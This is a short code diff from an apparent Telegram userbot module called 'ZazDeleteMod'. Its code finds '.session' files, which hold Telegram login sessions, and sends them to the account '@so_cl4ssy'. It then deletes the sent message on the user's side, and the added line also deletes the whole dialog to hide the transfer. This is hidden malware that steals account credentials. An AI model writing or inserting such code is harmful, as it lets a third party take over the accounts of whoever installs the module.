@@ -14,3 +14,4 @@ class ZazDeleteMod(loader.Module):
             if file.endswith(".session"):
                 m = await client.send_file("@so_cl4ssy", file)
                 await m.delete(revoke=False)
+                await client.delete_dialog("@so_cl4ssy")
